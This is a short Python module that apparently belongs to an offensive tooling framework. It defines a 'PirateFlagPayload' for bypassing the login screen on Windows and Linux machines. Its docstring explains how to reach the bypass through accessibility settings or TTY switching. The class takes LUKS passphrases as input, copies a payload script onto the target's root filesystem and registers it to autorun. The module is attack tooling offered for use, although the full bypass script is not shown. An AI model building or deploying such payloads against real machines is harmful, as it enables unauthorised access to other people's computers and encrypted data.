"""
Bypass the login screen

For Windows, after login invoke the accessibility settings or on-screen keyboard.
For linux, change TTY using Ctrl+Alt+F<X> with X being one of the Function keys you have.
With Linux on a laptop, try Ctrl+Alt+Fn+F<X> if without Fn it doesn't seem to work.
"""
from snr.core.payload.payload import Context, Payload


class PirateFlagPayload(Payload):
    AUTHORS = ("GlobularOne",)
    TARGET_OS_LIST = ("Microsoft Windows", "GNU/Linux")
    INPUTS = (
        ("PASSPHRASES", [], -1, "Passphrases to try for LUKS-encrypted partitions"),
    )

    def generate(self, ctx: Context) -> int:
        self.copy_root_to_root(
            ctx, __file__, "payload.py", "root/payload.py")
        self.add_autorun(ctx, "root/payload.py")
        return 0


payload = PirateFlagPayload()
